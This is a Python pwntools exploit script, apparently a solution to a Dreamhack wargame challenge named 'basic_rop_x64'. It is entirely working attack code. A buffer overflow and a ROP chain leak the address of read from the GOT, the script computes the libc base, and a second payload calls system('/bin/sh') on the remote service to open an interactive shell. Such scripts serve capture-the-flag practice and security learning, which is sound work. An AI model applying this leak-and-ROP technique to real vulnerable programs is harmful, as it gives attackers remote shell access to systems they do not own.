from pwn import *

#p = process("./basic_rop_x64")
p=remote("host3.dreamhack.games",13803)
#print(f"PID : {p.pid}")

def slog(name, addr): return success(': '.join([name, hex(addr)]))

#e = ELF("./basic_rop_x64")
#r = ROP("./basic_rop_x64")


dummy = b'a' * 0x48

e = context.binary = ELF("./basic_rop_x64", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
rop = ROP(e)

write_plt = e.plt["write"]
read_got = e.got["read"]
main = e.symbols["main"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
exit_offset = libc.symbols["exit"]
binsh_offset = next(libc.search(b"/bin/sh"))

pop_rdi = rop.find_gadget(
    ["pop rdi","ret"]
).address

pop_rsi = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address
ret = rop.find_gadget(["ret"]).address

payload = dummy
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(read_got)
payload += p64(0)
payload += p64(write_plt)
payload += p64(main)

p.send(payload)
p.recvuntil(b"a" * 0x40)
read_addr = u64(p.recvn(8))

libc_base = read_addr - read_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset
ex = libc_base + exit_offset

success(f"read: {read_addr:#x}")
success(f"libc base: {libc_base:#x}")
success(f"system: {system:#x}")
success(f"/bin/sh: {binsh:#x}")


payload = dummy
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.send(payload)
p.recvuntil(b"a" * 0x40)

p.interactive()
